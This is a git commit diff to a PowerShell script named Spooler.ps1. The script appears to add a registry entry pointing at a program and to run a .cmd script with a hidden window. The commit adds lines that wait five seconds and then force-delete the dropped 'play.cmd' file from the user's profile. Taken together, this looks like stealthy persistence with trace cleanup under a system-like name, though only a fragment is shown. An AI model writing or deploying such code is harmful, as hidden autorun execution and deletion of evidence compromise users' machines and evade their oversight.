f987b7d2fad0a61fc9421c7b7a0a219efbbd2e93
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-03 19:20:37 -0500

    Update Spooler.ps1

--- Spooler.ps1
+++ Spooler.ps1
@@ -31,3 +31,9 @@ New-ItemProperty -Path $registryKeyPath -Name $entryName -Value $programPath -Pr
 # Execute the .cmd script with the window closed
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden -Wait
 
+Start-Sleep -Seconds 5
+
+$fileName = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
+
+# Check if the file exists before attempting to delete it
+Remove-Item $fileName -Force
